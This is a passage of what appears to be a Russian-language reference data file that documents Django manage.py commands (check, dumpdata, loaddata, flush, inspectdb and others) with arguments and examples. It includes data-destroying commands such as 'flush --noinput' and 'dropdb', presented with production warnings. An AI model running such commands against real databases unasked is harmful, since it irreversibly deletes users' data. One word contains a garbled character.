            await cur.execute('SELECT 1')
            print(await cur.fetchone())
    await pool.close()

asyncio.run(main())

# 4. Контекст-менеджер всего пула (открытие+закрытие)
with ConnectionPool('postgresql://...') as pool:
    with pool.connection() as conn:
        ...
# При выходе пул закрывается.

# 5. Мониторинг
stats = pool.get_stats()
print(stats)
# {
#   'pool_min': 2, 'pool_max': 10,
#   'pool_size': 3, 'pool_available': 2,
#   'requests_num': 1234, 'requests_queued': 0, 'requests_wait_ms': 5,
#   'usage_ms': 12345,
#   ...
# }

# Ключевые отличия от внешнего pgbouncer:
#   ConnectionPool         — внутри Python-процесса, на каждый процесс свой
#   pgbouncer              — отдельный процесс, общий для всех Django-инстансов
# Для одного-двух Django-процессов достаточно ConnectionPool.
# Для десятков воркеров и горизонтального масштабирования — pgbouncer/RDS Proxy.`,
  },
  {
    name: "check",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py check — запускает встроенную систему проверок (system check framework) для всего проекта или указанных приложений. Проверяет конфигурацию настроек, корректность моделей (поля, индексы, related_name-конфликты), URL-конфигурацию, шаблоны, сторонние библиотеки. Выполняется автоматически перед runserver/migrate/test, но полезна как отдельный шаг в CI. Возвращает ненулевой exit-код при наличии ошибок указанного уровня и выше.",
    syntax:
      "manage.py check [app_label [app_label ...]] [--tag TAGS] [--database DATABASE] [--list-tags] [--deploy] [--fail-level LEVEL]",
    arguments: [
      {
        name: "app_label [app_label ...]",
        description:
          "Опциональный список меток приложений для проверки. Без аргументов проверяется весь проект.",
      },
      {
        name: "--tag TAGS, -t TAGS",
        description:
          "Запустить только проверки с указанным тегом. Можно повторять флаг для нескольких тегов. Доступные теги: models, admin, security, urls, templates, translation, signals, async, caches, compatibility, database, files, staticfiles, sites.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД для проверок, требующих подключения (например, проверки backend-зависимых индексов и constraints). По умолчанию проверки БД пропускаются.",
      },
      {
        name: "--list-tags",
        description:
          "Вывести список всех доступных тегов проверок и завершить. Полезно для исследования, какие подсистемы проверяются.",
      },
      {
        name: "--deploy",
        description:
          "Включить дополнительные deployment-проверки (security.W001-W022): SECURE_SSL_REDIRECT, SESSION_COOKIE_SECURE, CSRF_COOKIE_SECURE, X_FRAME_OPTIONS, ALLOWED_HOSTS, SECRET_KEY и т. д. Обычно используется в CI с DEBUG=False.",
      },
      {
        name: "--fail-level {CRITICAL,ERROR,WARNING,INFO,DEBUG}",
        description:
          "Минимальный уровень сообщения, при котором команда возвращает ненулевой exit-код. По умолчанию ERROR. WARNING делает CI строже (упадёт даже на предупреждениях).",
      },
    ],
    example: `# Базовая проверка всего проекта
$ python manage.py check
System check identified no issues (0 silenced).

# Только конкретные приложения
$ python manage.py check myapp blog

# Проверки только моделей
$ python manage.py check --tag models

# Несколько тегов сразу
$ python manage.py check -t models -t admin -t urls

# Список доступных тегов
$ python manage.py check --list-tags
admin
async_support
caches
compatibility
database
files
models
security
signals
sites
staticfiles
templates
translation
urls

# Deployment-проверки (для CI перед релизом)
$ DJANGO_SETTINGS_MODULE=myproject.settings.production \\
  python manage.py check --deploy --fail-level WARNING
?: (security.W004) You have not set a value for the SECURE_HSTS_SECONDS setting.
?: (security.W008) Your SECURE_SSL_REDIRECT setting is not set to True...
System check identified some issues:
ERRORS: ...

# В CI/CD (GitHub Actions / GitLab CI)
# - name: Django checks
#   run: |
#     python manage.py check --fail-level WARNING
#     python manage.py check --deploy --fail-level WARNING
#   env:
#     DJANGO_SETTINGS_MODULE: myproject.settings.production

# С проверкой БД (нужно подключение)
$ python manage.py check --database default

# Подавление конкретных предупреждений в settings.py
SILENCED_SYSTEM_CHECKS = ['security.W004', 'fields.W342']

# Кастомная проверка — регистрация в apps.py
from django.core.checks import register, Warning, Tags

@register(Tags.compatibility)
def check_python_version(app_configs, **kwargs):
    import sys
    if sys.version_info < (3, 11):
        return [Warning('Используется устаревшая версия Python', id='myapp.W001')]
    return []`,
  },
  {
    name: "compilemessages",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py compilemessages — компилирует .po-файлы переводов в бинарные .mo-файлы, которые Django загружает в память при старте. Запускается после редактирования переводов в .po-файлах (вручную или через сервис типа Weblate/Transifex). Без шага компиляции переводы не будут видны Django — gettext читает только .mo. Сканирует папки locale/ во всех INSTALLED_APPS и в LOCALE_PATHS. Требует установленного gettext (msgfmt).",
    syntax:
      "manage.py compilemessages [--locale LOCALE] [--exclude EXCLUDE] [--use-fuzzy] [--ignore PATTERN]",
    arguments: [
      {
        name: "--locale LOCALE, -l LOCALE",
        description:
          "Скомпилировать только указанную локаль (например, ru, en, de_AT). Можно повторять флаг для нескольких локалей. Без флага компилируются все найденные.",
      },
      {
        name: "--exclude EXCLUDE, -x EXCLUDE",
        description:
          "Локаль, которую НЕ компилировать. Полезно при выборочной обработке (компилировать всё, кроме экспериментального языка).",
      },
      {
        name: "--use-fuzzy, -f",
        description:
          "Включать в компиляцию переводы, помеченные как fuzzy (приблизительные, требующие ревью). По умолчанию игнорируются — соответствующая строка возвращается на исходном языке.",
      },
      {
        name: "--ignore PATTERN, -i PATTERN",
        description:
          "Glob-паттерн каталогов, которые нужно пропустить при поиске .po-файлов. Можно повторять. Например: -i node_modules -i .venv.",
      },
    ],
    example: `# Установка gettext (предварительно, на сервере/CI)
# Ubuntu/Debian: apt install gettext
# macOS:         brew install gettext
# Windows:       https://mlocati.github.io/articles/gettext-iconv-windows.html

# Структура переводов в проекте
# myproject/
# ├── locale/
# │   ├── ru/LC_MESSAGES/django.po          ← редактируется человеком
# │   ├── ru/LC_MESSAGES/django.mo          ← создаётся compilemessages
# │   ├── en/LC_MESSAGES/django.po
# │   └── en/LC_MESSAGES/django.mo

# Полный цикл работы с переводами
$ python manage.py makemessages -l ru -l en      # сгенерировать/обновить .po
# ... отредактировать django.po (msgstr "перевод")
$ python manage.py compilemessages                # скомпилировать .po → .mo

# Только русский
$ python manage.py compilemessages -l ru

# Несколько локалей
$ python manage.py compilemessages -l ru -l en -l de

# Все, кроме экспериментальной локали
$ python manage.py compilemessages -x experimental_lang

# Включая fuzzy-переводы (риск показать неточный перевод)
$ python manage.py compilemessages --use-fuzzy

# Игнорировать сторонние пакеты
$ python manage.py compilemessages -i node_modules -i venv

# В CI/Docker — обязательный шаг сборки
# Dockerfile:
# RUN apt-get update && apt-get install -y gettext
# RUN python manage.py compilemessages

# Проверка результата
$ ls locale/ru/LC_MESSAGES/
django.mo  django.po

# Использование в коде после компиляции:
from django.utils.translation import gettext_lazy as _

class Article(models.Model):
    title = models.CharField(_('Заголовок'), max_length=200)
    # При активной русской локали и наличии .mo вернёт перевод

# settings.py
LANGUAGE_CODE = 'ru'
USE_I18N = True
LOCALE_PATHS = [BASE_DIR / 'locale']               # доп. пути с переводами
LANGUAGES = [('ru', 'Русский'), ('en', 'English')]

# Если .mo нет — Django покажет msgid (исходную строку).
# Если .mo есть, но устарел — увидите старый перевод. Перекомпилировать после
# каждой правки .po обязательно.`,
  },
  {
    name: "createcachetable",
    category: "django-admin and manage.py",
    description:
      'Команда manage.py createcachetable — создаёт в БД таблицы, используемые database-кешем (django.core.cache.backends.db.DatabaseCache). Имена таблиц берутся из CACHES["LOCATION"]. Команду нужно запускать однократно при первоначальной настройке кеша или при добавлении нового алиаса CACHES. Эквивалентна CREATE TABLE с правильной схемой (cache_key, value, expires) и индексами. Для других backend (Redis, Memcached, locmem, file) команда не нужна.',
    syntax: "manage.py createcachetable [--database DATABASE] [--dry-run]",
    arguments: [
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которой создавать таблицы. По умолчанию default. Полезно при использовании нескольких БД с DATABASE_ROUTERS.",
      },
      {
        name: "--dry-run",
        description:
          "Не выполнять CREATE TABLE, а только напечатать SQL, который был бы выполнен. Полезно для просмотра схемы перед применением или для ручного запуска через миграции.",
      },
    ],
    example: `# settings.py — конфигурация database cache
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'my_cache_table',         # имя таблицы в БД
        'TIMEOUT': 300,                       # 5 минут по умолчанию
        'OPTIONS': {
            'MAX_ENTRIES': 1000,              # лимит записей
            'CULL_FREQUENCY': 3,              # удалять 1/3 при превышении
        },
    },
    'sessions': {                             # отдельный кеш для сессий
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'session_cache_table',
    },
}

# Создать таблицы (один раз при настройке)
$ python manage.py createcachetable
Cache table 'my_cache_table' created.
Cache table 'session_cache_table' created.

# Команда создаст по таблице на каждый алиас CACHES типа DatabaseCache.

# Просмотр генерируемого SQL без выполнения
$ python manage.py createcachetable --dry-run
BEGIN;
CREATE TABLE "my_cache_table" (
    "cache_key" varchar(255) NOT NULL PRIMARY KEY,
    "value" text NOT NULL,
    "expires" timestamp with time zone NOT NULL
);
CREATE INDEX "my_cache_table_expires" ON "my_cache_table" ("expires");
COMMIT;

# В отдельной БД
$ python manage.py createcachetable --database=cache_db

# Использование кеша после создания таблицы
from django.core.cache import cache, caches

cache.set('user:123:profile', user_data, timeout=600)
cached = cache.get('user:123:profile')

# Отдельный кеш-алиас
caches['sessions'].set('session_xyz', session_data)

# Когда database cache уместен:
# + Не нужен отдельный сервис (Redis/Memcached) — всё в БД
# + Транзакционная согласованность — кеш обновляется в одной транзакции
# + Простой бэкап (вместе с обычным дампом БД)
# - Медленнее Redis/Memcached на порядок (overhead SQL-запросов)
# - Нагружает основную БД
# - Подходит для small/medium-нагрузок (< 100 RPS)

# Очистка устаревших записей — Django делает автоматически при cache.set()
# (с вероятностью 1/CULL_FREQUENCY). Полная очистка вручную:
cache.clear()                                 # DELETE FROM my_cache_table

# Альтернатива через миграцию (для воспроизводимости):
from django.core.management import call_command
class Migration(migrations.Migration):
    operations = [
        migrations.RunPython(
            lambda apps, schema_editor: call_command('createcachetable'),
            reverse_code=migrations.RunPython.noop,
        ),
    ]`,
  },
  {
    name: "dbshell",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py dbshell — запускает интерактивную консоль СУБД (psql для PostgreSQL, mysql для MySQL/MariaDB, sqlplus для Oracle, sqlite3 для SQLite) с уже подставленными параметрами подключения из DATABASES. Удобна для быстрых ad-hoc запросов: не нужно искать пароль и хост, всё уже из settings.py. Требует установленного клиента БД на машине, где выполняется команда.",
    syntax: "manage.py dbshell [--database DATABASE] [-- ARGUMENTS]",
    arguments: [
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, к которой подключаться. По умолчанию default. Используется при наличии нескольких БД (replica, analytics).",
      },
      {
        name: "-- ARGUMENTS",
        description:
          'Всё после "--" передаётся напрямую клиенту БД. Например: -- -c "SELECT 1" для psql выполнит запрос и выйдет; -- --html для psql включит HTML-вывод.',
      },
    ],
    example: `# Открыть psql/mysql/sqlite3 для default-БД
$ python manage.py dbshell
psql (15.4)
Type "help" for help.

mydb=>

# В psql — обычные команды
mydb=> \\dt                            -- список таблиц
mydb=> SELECT count(*) FROM auth_user;
mydb=> \\d+ myapp_article              -- описание таблицы
mydb=> \\q                             -- выход

# Подключение к replica-БД
$ python manage.py dbshell --database=replica

# Передать аргументы клиенту (после --)
$ python manage.py dbshell -- -c "SELECT count(*) FROM auth_user"
 count
-------
   1234

# Выполнить SQL-файл через psql
$ python manage.py dbshell -- -f myscript.sql

# Подавить заголовок psql и выводить только данные
$ python manage.py dbshell -- -t -A -c "SELECT email FROM auth_user"

# Для MySQL — те же принципы, но синтаксис клиентский
$ python manage.py dbshell -- -e "SHOW TABLES"

# Для SQLite — sqlite3 CLI
$ python manage.py dbshell
SQLite version 3.40.0
sqlite> .tables
sqlite> .schema auth_user
sqlite> SELECT * FROM auth_user LIMIT 5;
sqlite> .quit

# Что нужно установить локально:
#   PostgreSQL: psql        (apt install postgresql-client)
#   MySQL:      mysql       (apt install mysql-client)
#   SQLite:     sqlite3     (apt install sqlite3)
#   Oracle:     sqlplus     (Oracle Instant Client)

# Безопасность:
# Команда логинится как DATABASES["..."]["USER"] с правами на write.
# В production лучше использовать отдельного read-only пользователя
# через --database=readonly алиас:
DATABASES = {
    'default':   {..., 'USER': 'app_rw'},
    'readonly':  {..., 'USER': 'app_ro'},     # только SELECT
}
$ python manage.py dbshell --database=readonly

# В Replit/Heroku — клиент psql обычно уже установлен,
# можно подключиться к production-БД одной командой:
$ python manage.py dbshell                    # параметры из env-переменных`,
  },
  {
    name: "diffsettings",
    category: "django-admin and manage.py",
    description:
      'Команда manage.py diffsettings — выводит, какие настройки в текущем settings.py отличаются от значений по умолчанию Django. Незаменима при отладке: «почему у меня не работает middleware?» — посмотрите, что переопределено. Также полезна при ревизии конфигурации production vs development. По умолчанию формат "###" — звёздочки слева отмечают изменённые. Поддерживает unified-diff формат (как git diff) для копирования в issue/PR.',
    syntax:
      "manage.py diffsettings [--all] [--default MODULE] [--output {hash,unified}]",
    arguments: [
      {
        name: "--all",
        description:
          "Показать все настройки (включая совпадающие с дефолтом). Без флага показываются только переопределённые.",
      },
      {
        name: "--default MODULE",
        description:
          "Сравнивать с указанным модулем настроек, а не с django.conf.global_settings. Используется для сравнения, например, settings.production против settings.base.",
      },
      {
        name: "--output {hash,unified}",
        description:
          'Формат вывода. hash — стандартный с "###" префиксами. unified — git-style diff с "+"/"-" префиксами, удобен для код-ревью и копирования в PR.',
      },
    ],
    example: `# Базовый вывод — отличия от django.conf.global_settings
$ python manage.py diffsettings
ALLOWED_HOSTS = ['example.com', 'www.example.com']
DATABASES = {'default': {'ENGINE': 'django.db.backends.postgresql', ...}}
DEBUG = False
INSTALLED_APPS = ['django.contrib.admin', 'django.contrib.auth', ...]
SECRET_KEY = '<secret>'
TEMPLATES = [{'BACKEND': 'django.template.backends.django.DjangoTemplates', ...}]
TIME_ZONE = 'Europe/Moscow'
### USE_I18N = True
### USE_TZ = True
###  — означает, что значение совпадает с дефолтом Django (но было явно переопределено)

# Все настройки, включая дефолтные
$ python manage.py diffsettings --all

# Сравнение с собственным base settings (наследование)
# myproject/settings/base.py        — базовые
# myproject/settings/production.py  — production-специфика (наследует base)
$ DJANGO_SETTINGS_MODULE=myproject.settings.production \\
  python manage.py diffsettings --default=myproject.settings.base
DEBUG = False
ALLOWED_HOSTS = ['example.com']
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
DATABASES = {...}                              # с production-параметрами
# Видно ровно то, что добавляет production к base.

# Unified-формат для PR/code review
$ python manage.py diffsettings --output=unified
- ALLOWED_HOSTS = []
+ ALLOWED_HOSTS = ['example.com', 'www.example.com']
- DEBUG = True
+ DEBUG = False
- TIME_ZONE = 'America/Chicago'
+ TIME_ZONE = 'Europe/Moscow'

# Типичный сценарий — выяснить причину неожиданного поведения
$ python manage.py diffsettings | grep -i middleware
MIDDLEWARE = ['django.middleware.security.SecurityMiddleware', ...]
# → точный порядок и состав middleware

$ python manage.py diffsettings | grep -i database
DATABASES = {'default': {'ENGINE': 'django.db.backends.postgresql', ...}}

# Проверка production-конфигурации в CI
$ DJANGO_SETTINGS_MODULE=myproject.settings.production \\
  python manage.py diffsettings --output=unified > settings.diff
# Сохранить результат как артефакт CI и просматривать в PR.

# Безопасность:
# diffsettings выводит SECRET_KEY, DATABASES.PASSWORD и другие секреты.
# В CI-логах и баг-репортах — фильтровать перед публикацией:
$ python manage.py diffsettings | \\
  sed 's/PASSWORD.*/PASSWORD=<redacted>/' | \\
  sed "s/SECRET_KEY.*/SECRET_KEY='<redacted>'/"`,
  },
  {
    name: "dumpdata",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py dumpdata — сериализует содержимое БД в формат, пригодный для последующей загрузки через loaddata. По умолчанию JSON; поддерживается также XML и YAML. Используется для бэкапов фикстур, миграции данных между средами (dev → staging), создания seed-данных для тестов. Без аргументов выгружает все приложения; можно сузить до конкретных моделей. Не подходит для бэкапа большой production-БД — вместо неё используйте pg_dump/mysqldump.",
    syntax:
      "manage.py dumpdata [app_label[.ModelName] ...] [--all] [--format FORMAT] [--indent INDENT] [--exclude EXCLUDE] [--database DATABASE] [--natural-foreign] [--natural-primary] [--pks PRIMARY_KEYS] [--output OUTPUT]",
    arguments: [
      {
        name: "app_label[.ModelName] ...",
        description:
          'Список приложений или конкретных моделей для выгрузки. Без аргументов выгружаются все. Формат: "myapp" (всё приложение) или "myapp.Article" (только одна модель).',
      },
      {
        name: "--all, -a",
        description:
          "Использовать default-менеджер вместо стандартного — возвращает ВСЕ объекты, включая отфильтрованные кастомным менеджером (например, soft-deleted записи).",
      },
      {
        name: "--format FORMAT",
        description:
          "Формат сериализации: json (по умолчанию), xml, yaml. Для YAML требуется PyYAML, для XML — встроено.",
      },
      {
        name: "--indent INDENT",
        description:
          "Количество пробелов отступа в выходном JSON/XML для читаемости. Без флага — компактный однострочный вывод.",
      },
      {
        name: "--exclude EXCLUDE, -e EXCLUDE",
        description:
          "Приложение или модель, которое НЕ выгружать. Можно повторять. Часто исключают auth.permission и contenttypes — Django их пересоздаёт автоматически.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД, из которой выгружать данные. По умолчанию default.",
      },
      {
        name: "--natural-foreign",
        description:
          "Использовать natural keys для FK-связей вместо численных pk. Делает дамп переносимым между БД с разными pk-нумерациями. Требует, чтобы у моделей был natural_key()-метод и менеджер с get_by_natural_key().",
      },
      {
        name: "--natural-primary",
        description:
          "Использовать natural keys и для самих pk выгружаемых объектов, не только для FK. Делает дамп полностью независимым от численных id.",
      },
      {
        name: "--pks PRIMARY_KEYS",
        description:
          'Выгрузить только объекты с указанными pk (через запятую, без пробелов: "1,5,42"). Работает только при выгрузке одной модели (myapp.Article).',
      },
      {
        name: "--output OUTPUT, -o OUTPUT",
        description:
          "Файл для записи. Без флага — вывод в stdout. С флагом поддерживается потоковая запись и автоматическое сжатие по расширению (.gz, .bz2, .xz, .lzma).",
      },
    ],
    example: `# Выгрузить весь проект в JSON (stdout)
$ python manage.py dumpdata > backup.json

# С отступами для читаемости
$ python manage.py dumpdata --indent 2 > backup.json

# Только одно приложение
$ python manage.py dumpdata blog > blog_data.json

# Только конкретная модель
$ python manage.py dumpdata blog.Article > articles.json

# Несколько моделей сразу
$ python manage.py dumpdata blog.Article blog.Comment auth.User -o data.json

# Конкретные записи по pk
$ python manage.py dumpdata blog.Article --pks 1,5,42

# Исключить системные таблицы (стандартная практика)
$ python manage.py dumpdata \\
    --exclude auth.permission \\
    --exclude contenttypes \\
    --exclude admin.logentry \\
    --exclude sessions \\
    -o full_backup.json
# Эти таблицы Django пересоздаёт сам на основе моделей и миграций —
# их выгрузка приводит к конфликтам id при loaddata.

# С natural keys для переносимости
$ python manage.py dumpdata blog \\
    --natural-foreign --natural-primary \\
    --indent 2 -o blog_fixture.json
# Пример: ContentType вместо id будет ["app_label", "model"] —
# совпадёт на любой инсталляции.

# В YAML
$ python manage.py dumpdata blog --format=yaml -o blog.yaml

# Со сжатием (определяется по расширению файла)
$ python manage.py dumpdata -o backup.json.gz       # gzip
$ python manage.py dumpdata -o backup.json.xz       # xz
$ python manage.py dumpdata -o backup.json.bz2      # bzip2

# Из replica-БД
$ python manage.py dumpdata --database=replica blog > blog.json

# Создание seed-фикстур для тестов
$ python manage.py dumpdata blog.Category --indent 2 \\
    -o blog/fixtures/categories.json
# В тестах:
# class BlogTest(TestCase):
#     fixtures = ['categories.json']

# Загрузка обратно
$ python manage.py loaddata backup.json

# Включая объекты, отфильтрованные кастомным менеджером (soft-delete)
class Article(models.Model):
    is_deleted = models.BooleanField(default=False)
    objects = ActiveManager()                 # фильтрует is_deleted=True
    all_objects = models.Manager()            # видит всё

$ python manage.py dumpdata blog.Article --all > with_deleted.json

# ВАЖНО: НЕ использовать для бэкапа production-БД целиком
# Минусы:
#   - грузит всё в память (OOM на больших таблицах)
#   - не сохраняет sequences/auto_increment счётчики
#   - не воспроизводит точную схему (только данные)
#   - медленно для миллионов записей
# Для production-бэкапа: pg_dump (PG), mysqldump (MySQL), sqlite3 .backup`,
  },
  {
    name: "flush",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py flush — удаляет ВСЕ данные из БД (кроме структуры таблиц), сбрасывает счётчики автоинкремента и заново выполняет post-migrate сигналы (которые создают начальные данные: ContentType, Permission, дефолтные Site и т.п.). Эквивалент TRUNCATE для всех управляемых Django таблиц. Не удаляет миграции — схема остаётся. Используется для очистки dev/staging-БД, между прогонами интеграционных тестов, для сброса состояния перед загрузкой свежей фикстуры. На production использовать опасно.",
    syntax: "manage.py flush [--noinput] [--database DATABASE]",
    arguments: [
      {
        name: "--noinput, --no-input",
        description:
          "Пропустить интерактивное подтверждение «Are you sure? Type yes to continue». Обязательно для использования в скриптах/CI. Без флага команда зависнет в ожидании ввода.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, которую очg�щать. По умолчанию default. Для каждой БД flush нужно вызывать отдельно.",
      },
    ],
    example: `# Базовое использование (с подтверждением)
$ python manage.py flush
You have requested a flush of the database.
This will IRREVERSIBLY DESTROY all data currently in the 'mydb' database,
and return each table to an empty state.
Are you sure you want to do this?
    Type 'yes' to continue, or 'no' to cancel: yes
Installed 0 object(s) from 0 fixture(s)

# Без подтверждения (для скриптов и CI)
$ python manage.py flush --noinput

# Конкретная БД (если несколько в DATABASES)
$ python manage.py flush --database=test_db --noinput

# Что именно делает flush:
# 1. Для каждой таблицы из INSTALLED_APPS: DELETE FROM <table>;
# 2. Сброс sequence/auto_increment счётчиков (ALTER SEQUENCE ... RESTART)
# 3. Снова отправляет сигнал post_migrate — переcоздаются:
#    - ContentType для всех моделей
#    - Permission (add/change/delete/view) на каждую модель
#    - django.contrib.sites.Site (если установлен)
# 4. Загружает initial fixtures (если объявлены)

# Что flush НЕ делает (в отличие от schema-сброса):
#   - не удаляет таблицы (DROP TABLE)
#   - не удаляет миграции
#   - не трогает django_migrations таблицу
#   - не пересоздаёт схему

# Типичные сценарии:

# 1. Очистка dev-БД перед загрузкой свежей фикстуры
$ python manage.py flush --noinput
$ python manage.py loaddata seed.json

# 2. Между интеграционными тестами в CI
- name: Reset DB
  run: python manage.py flush --noinput
- name: Load test data
  run: python manage.py loaddata tests/fixtures/data.json

# 3. Сброс staging после демо
$ DJANGO_SETTINGS_MODULE=myproject.settings.staging \\
  python manage.py flush --noinput

# Альтернативы для разных целей:

# Полное пересоздание схемы (удалить всё, включая структуру):
$ python manage.py sqlflush          # SQL для очистки (без выполнения)
$ dropdb mydb && createdb mydb       # удалить и создать БД заново
$ python manage.py migrate

# Только конкретная модель (без flush):
Article.objects.all().delete()        # ORM, медленно для миллионов
Article.objects.raw('TRUNCATE TABLE myapp_article')  # быстро, но без сигналов

# ОПАСНОСТЬ В PRODUCTION:
# flush безвозвратно удаляет ВСЕ пользовательские данные.
# Защита от случайного запуска в production — проверка settings:
import sys
from django.conf import settings
if 'flush' in sys.argv and not settings.DEBUG:
    raise SystemExit('flush запрещён при DEBUG=False')
# Или ограничить через права на БД (READ-ONLY в production).`,
  },
  {
    name: "inspectdb",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py inspectdb — анализирует существующую схему БД и генерирует Python-код моделей Django, соответствующий найденным таблицам. Незаменима при подключении Django к legacy-БД (которая существовала до Django) или при импорте схемы из внешней системы. Сгенерированные модели помечены как managed = False — Django не будет их менять через миграции. Поддерживает таблицы, представления (views) и партиции. Не идеальна — после генерации модели обычно требуют ручной правки (related_name, choices, типы для редких колонок).",
    syntax:
      "manage.py inspectdb [table [table ...]] [--database DATABASE] [--include-partitions] [--include-views]",
    arguments: [
      {
        name: "table [table ...]",
        description:
          "Опциональный список конкретных таблиц для инспекции. Без аргументов сканируются все таблицы в БД.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД для инспекции. По умолчанию default. Используется при подключении к нескольким БД (legacy + Django).",
      },
      {
        name: "--include-partitions",
        description:
          "Включать partition-таблицы PostgreSQL (CREATE TABLE ... PARTITION OF ...). По умолчанию пропускаются. Только для PostgreSQL.",
      },
      {
        name: "--include-views",
        description:
          "Включать database views в результат генерации. По умолчанию обрабатываются только обычные таблицы. View превращаются в managed=False модели для read-only доступа через ORM.",
      },
    ],
    example: `# Базовое использование — вывести модели всех таблиц в stdout
$ python manage.py inspectdb > models.py

# Только указанные таблицы
$ python manage.py inspectdb users orders products > legacy_models.py

# Из конкретной БД
$ python manage.py inspectdb --database=legacy > legacy/models.py

# Включая views (для read-only доступа через ORM)
$ python manage.py inspectdb --include-views

# Включая партиции (PostgreSQL)
$ python manage.py inspectdb --include-partitions

# Пример сгенерированного результата:
# This is an auto-generated Django model module.
# You'll have to do the following manually to clean this up:
#   * Rearrange models' order
#   * Make sure each model has one field with primary_key=True
#   * Make sure each ForeignKey and OneToOneField has on_delete set
#   * Remove 'managed = False' lines if you wish to allow Django
#     to create, modify, and delete the table
from django.db import models

class LegacyUsers(models.Model):
    id = models.AutoField(primary_key=True)
    email = models.CharField(unique=True, max_length=255)
    created_at = models.DateTimeField()
    company = models.ForeignKey('LegacyCompanies', models.DO_NOTHING, blank=True, null=True)

    class Meta:
        managed = False                       # Django не будет создавать/менять таблицу
        db_table = 'legacy_users'             # точное имя из БД

class LegacyCompanies(models.Model):
    id = models.AutoField(primary_key=True)
    name = models.CharField(max_length=255)

    class Meta:
        managed = False
        db_table = 'legacy_companies'

# Типичный workflow подключения к legacy-БД:

# 1. Добавить алиас БД в settings.py
DATABASES = {
    'default': {'ENGINE': 'django.db.backends.postgresql', 'NAME': 'newapp'},
    'legacy':  {'ENGINE': 'django.db.backends.mysql',      'NAME': 'oldsystem'},
}

# 2. Сгенерировать модели
$ python manage.py inspectdb --database=legacy > apps/legacy/models.py

# 3. Создать router для маршрутизации запросов
# apps/legacy/routers.py
class LegacyRouter:
    def db_for_read(self, model, **hints):
        if model._meta.app_label == 'legacy':
            return 'legacy'
        return None
    db_for_write = db_for_read
    def allow_migrate(self, db, app_label, **hints):
        return None if app_label != 'legacy' else False

DATABASE_ROUTERS = ['apps.legacy.routers.LegacyRouter']

# 4. Использовать как обычные модели Django
from apps.legacy.models import LegacyUsers
LegacyUsers.objects.using('legacy').filter(email__endswith='@example.com')

# Что нужно поправить вручную после inspectdb:
#   - on_delete у ForeignKey (по умолчанию ставит DO_NOTHING)
#   - related_name (генерируются автоматически как 'X_set', часто конфликтуют)
#   - choices для enum-колонок (inspectdb не угадывает)
#   - проверить max_length у CharField (особенно для MySQL TEXT vs VARCHAR)
#   - composite primary keys (Django <5.2 не поддерживает — ставится unique_together)
#   - column types, которые inspectdb не распознал — будут как TextField с комментарием

# Для views (read-only):
$ python manage.py inspectdb --include-views v_user_stats > stats_models.py
# Сгенерированная модель:
class VUserStats(models.Model):
    user_id = models.IntegerField(primary_key=True)
    total_orders = models.IntegerField()
    last_login = models.DateTimeField()
    class Meta:
        managed = False
        db_table = 'v_user_stats'`,
  },
  {
    name: "loaddata",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py loaddata — загружает в БД фикстуры (JSON/XML/YAML), созданные через dumpdata или написанные вручную. Используется для seed-данных, тестовых данных, начального состояния production. Поиск файлов идёт в FIXTURE_DIRS, в подпапках fixtures/ всех INSTALLED_APPS, и по абсолютному пути. Поддерживает сжатые файлы (.gz, .bz2, .xz, .zip). Загрузка идёт в одной транзакции — при ошибке откатывается полностью. Может загружать в любую БД, включая через app_label (если фикстура неоднозначна).",
    syntax:
      "manage.py loaddata fixture [fixture ...] [--database DATABASE] [--ignorenonexistent] [--app APP_LABEL] [--format FORMAT] [--exclude EXCLUDE]",
    arguments: [
      {
        name: "fixture [fixture ...]",
        description:
          'Имена фикстур для загрузки (без расширения, например "categories") или полный путь ("/path/to/data.json"). Без расширения Django ищет во всех известных каталогах и форматах.',
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которую загружать. По умолчанию default.",
      },
      {
        name: "--ignorenonexistent, -i",
        description:
          "Игнорировать в фикстуре поля и модели, которых больше нет в схеме. Без флага загрузка падает с ошибкой. Полезно при загрузке старых дампов после удаления полей/моделей.",
      },
      {
        name: "--app APP_LABEL",
        description:
          "Искать фикстуру только внутри одного указанного приложения. Используется для разрешения неоднозначности, когда фикстура с одинаковым именем есть в нескольких приложениях.",
      },
      {
        name: "--format FORMAT",
        description:
          "Явный формат фикстуры (json, xml, yaml). Нужен только когда имя файла без расширения и Django не может угадать формат.",
      },
      {
        name: "--exclude EXCLUDE, -e EXCLUDE",
        description:
          "Не загружать объекты указанного приложения или модели из фикстуры. Можно повторять флаг. Например: -e contenttypes -e auth.permission.",
      },
    ],
    example: `# Базовая загрузка по имени (Django сам найдёт файл)
$ python manage.py loaddata initial_data
Installed 42 object(s) from 1 fixture(s)

# Поиск идёт в:
#   1. <app>/fixtures/initial_data.{json,xml,yaml,json.gz,...} для каждого app
#   2. Каталоги из FIXTURE_DIRS
#   3. Абсолютный/относительный путь, если содержит /

# settings.py — добавить общий каталог фикстур
FIXTURE_DIRS = [BASE_DIR / 'fixtures']

# Несколько фикстур (загружаются в порядке указания)
$ python manage.py loaddata users articles comments

# Прямой путь к файлу
$ python manage.py loaddata /backups/2026-04-29.json.gz

# Сжатые файлы (формат определяется по расширению)
$ python manage.py loaddata snapshot.json.gz
$ python manage.py loaddata snapshot.json.xz
$ python manage.py loaddata snapshot.json.bz2

# В конкретную БД
$ python manage.py loaddata --database=staging seed.json

# Игнорировать удалённые поля/модели (старый дамп → новая схема)
$ python manage.py loaddata --ignorenonexistent old_backup.json
# Без флага: DeserializationError: KeyError: 'removed_field'

# Из конкретного приложения (разрешение неоднозначности)
# Если есть apps/blog/fixtures/categories.json и apps/shop/fixtures/categories.json
$ python manage.py loaddata categories --app blog

# Исключить системные таблицы
